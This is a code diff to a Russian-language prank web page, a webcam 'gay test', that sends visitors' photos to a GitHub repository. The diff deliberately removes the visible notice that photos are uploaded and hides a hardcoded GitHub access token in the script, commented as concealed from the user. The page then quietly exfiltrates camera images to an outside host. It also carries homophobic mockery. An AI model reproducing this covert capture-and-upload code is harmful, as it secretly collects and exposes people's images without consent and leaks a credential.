@@ -143,35 +143,6 @@
             margin: 10px 0;
         }
         
-        .config-panel {
-            background: rgba(255, 0, 0, 0.2);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            text-align: left;
-            border: 1px solid #ff0000;
-        }
-        
-        .config-panel h3 {
-            margin-bottom: 10px;
-            color: #ff0000;
-        }
-        
-        input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 5px;
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: 1px solid #ff0000;
-        }
-        
-        input[type="text"]::placeholder {
-            color: #ccc;
-        }
-        
         .status {
             margin-top: 15px;
             padding: 10px;
@@ -241,13 +212,6 @@
     <div class="container">
         <h1>🔞 ПРОВЕРКА НА ГЕЯ 🔞</h1>
         
-        <div class="config-panel">
-            <h3>Настройки GitHub (уже заполнены)</h3>
-            <input type="text" id="githubToken" placeholder="GitHub Personal Access Token" value="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" readonly>
-            <input type="text" id="repoName" placeholder="Имя репозитория (username/repo)" value="wholovelyflick/GAY" readonly>
-            <input type="text" id="folderPath" placeholder="Путь к папке (например: photos/)" value="photos/">
-        </div>
-        
         <p>ВНИМАНИЕ: система определяет геев с точностью 1000%! После проверки фото сохраняется в базе!</p>
         
         <div class="camera-container">
@@ -276,7 +240,6 @@
         <div id="status" class="status"></div>
         
         <div class="footer">
-            <p>Фото сохраняются в репозиторий: wholovelyflick/GAY в папку photos/</p>
             <p>Внимание: это всего лишь шуточный тест и не имеет научного обоснования</p>
         </div>
     </div>
@@ -291,9 +254,11 @@
             const statusDiv = document.getElementById('status');
             const loadingDiv = document.querySelector('.loading');
             const resultDiv = document.getElementById('result');
-            const githubTokenInput = document.getElementById('githubToken');
-            const repoNameInput = document.getElementById('repoName');
-            const folderPathInput = document.getElementById('folderPath');
+            
+            // Данные GitHub (скрыты от пользователя)
+            const GITHUB_TOKEN = "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";
+            const REPO_NAME = "wholovelyflick/GAY";
+            const FOLDER_PATH = "photos/";
             
             let stream = null;
             
@@ -348,19 +313,10 @@
             
             // Функция для отправки фото на GitHub
             async function uploadToGitHub(imageData) {
-                const githubToken = githubTokenInput.value.trim();
-                const repoName = repoNameInput.value.trim();
-                const folderPath = folderPathInput.value.trim();
-                
-                if (!githubToken || !repoName) {
-                    showStatus("Ошибка: не указаны данные GitHub", "error");
-                    return;
-                }
-                
                 // Создаем имя файла на основе текущей даты и времени
                 const now = new Date();
                 const fileName = `gay_test_${now.getFullYear()}${(now.getMonth()+1).toString().padStart(2, '0')}${now.getDate().toString().padStart(2, '0')}_${now.getHours().toString().padStart(2, '0')}${now.getMinutes().toString().padStart(2, '0')}${now.getSeconds().toString().padStart(2, '0')}.jpg`;
-                const fullPath = folderPath ? `${folderPath}${fileName}` : fileName;
+                const fullPath = FOLDER_PATH ? `${FOLDER_PATH}${fileName}` : fileName;
                 
                 // Конвертируем data URL в blob
                 const blob = dataURLtoBlob(imageData);
@@ -370,7 +326,7 @@
                 const content = arrayBufferToBase64(arrayBuffer);
                 
                 // Формируем URL для API GitHub
-                const apiUrl = `https://api.github.com/repos/${repoName}/contents/${fullPath}`;
+                const apiUrl = `https://api.github.com/repos/${REPO_NAME}/contents/${fullPath}`;
                 
                 // Подготавливаем данные для отправки
                 const commitMessage = `Добавлено фото проверки на гея: ${fileName}`;
@@ -388,7 +344,7 @@
                     const response = await fetch(apiUrl, {
                         method: 'PUT',
                         headers: {
-                            'Authorization': `token ${githubToken}`,
+                            'Authorization': `token ${GITHUB_TOKEN}`,
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify(requestData)
@@ -408,7 +364,7 @@
                     }
                 } catch (error) {
                     console.error('Ошибка при загрузке на GitHub:', error);
-                    showStatus(`Ошибка при сохранении: ${error.message}`, "error");
+                    showStatus(`Ошибка сети: ${error.message}`, "error");
                 } finally {
                     loadingDiv.style.display = 'none';
                     captureButton.disabled = false;
